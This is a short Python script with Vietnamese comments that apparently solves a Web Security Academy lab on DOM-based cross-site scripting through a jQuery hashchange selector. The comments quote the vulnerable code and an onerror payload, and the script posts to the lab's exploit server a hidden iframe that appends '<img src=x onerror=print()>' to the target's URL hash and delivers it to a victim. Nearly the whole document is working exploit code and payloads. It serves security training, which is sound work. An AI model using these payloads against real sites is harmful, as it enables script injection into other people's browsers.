# trang web xảy ra lỗi khi xử lý hàm hashchange
# web sẽ lấy toàn bộ đoạn mã sau dấu `#` trong url và xử lý nó
# -đoạn mã sau dấu `#` không bị mã hóa url 
# -lợi dụng điều này ta sẽ chèn vào sau dấu `#` một chuỗi ký tự bất kỳ và thực thi mã tùy ý
# Ví dụ chèn #<img =x onerror="alert(1)">

# đoạn mã gây ra lỗi :
# <script>
#     $(window).on('hashchange', function(){
#         var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
#         if (post) post.get(0).scrollIntoView();
#     });
# </script>

import requests

burp0_url = "https://exploit-YOUR_EXPLOIT_HOST.exploit-server.net:443/"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}
burp0_data = {
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
    "responseBody": "<iframe src=\"https://YOUR_HOST.web-security-academy.net/#\" onload=\"this.src+='<img src=x onerror=print()>'\" hidden=\"hidden\"></iframe>",
    "formAction": "DELIVER_TO_VICTIM"
}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)